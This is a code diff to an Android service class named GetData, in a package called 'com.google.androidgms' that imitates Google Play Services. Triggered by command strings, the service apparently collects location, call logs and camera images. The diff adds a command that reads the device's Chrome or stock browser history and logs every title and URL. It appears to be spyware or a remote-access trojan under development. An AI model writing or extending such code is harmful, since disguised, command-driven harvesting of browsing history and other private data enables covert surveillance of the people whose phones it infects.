@@ -3,6 +3,7 @@ package com.google.androidgms;
 import android.app.IntentService;
 import android.content.Intent;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
@@ -16,6 +17,7 @@ import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.SystemClock;
+import android.provider.Browser;
 import android.provider.CallLog;
 import android.provider.MediaStore;
 import android.util.Log;
@@ -96,6 +98,39 @@ public class GetData extends IntentService{
             }
             locationManager.removeUpdates(g1);
         }
+        else if(intent.getStringExtra(Msg).equals("browser"))
+        {
+            Uri uriCustom;
+            String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
+            String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
+            if(isAppInstalled("com.android.chrome"))
+            {
+                Log.d("browser","chrome installed");
+                uriCustom = Uri.parse("content://com.android.chrome.browser/bookmarks");
+            }
+            else
+            {
+                Log.d("browser","chrome not installed");
+                uriCustom = Browser.BOOKMARKS_URI;
+            }
+
+            Cursor mCur = getContentResolver().query(uriCustom, proj, sel, null, null);
+            mCur.moveToFirst();
+
+            String title = "";
+            String url = "";
+
+            if (mCur.moveToFirst() && mCur.getCount() > 0) {
+                boolean cont = true;
+                while (mCur.isAfterLast() == false && cont) {
+
+                    title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
+                    url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
+                    Log.d("browser","title: "+title+" url: "+url);
+                    mCur.moveToNext();
+                }
+            }
+        }
         else if(intent.getStringExtra(Msg).equals("logs")){
             Cursor c1 = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null);
             if(c1!=null){
@@ -148,6 +183,19 @@ public class GetData extends IntentService{
                     camera.release();
                 }
         }
+    }
+
+    private boolean isAppInstalled(String uri)
+    {
+        PackageManager pm = getPackageManager();
+        boolean installed = false;
+        try {
+            pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
+            installed = true;
+        } catch (PackageManager.NameNotFoundException e) {
+            installed = false;
+        }
+        return installed;
     }
 
     private class getLocation implements LocationListener
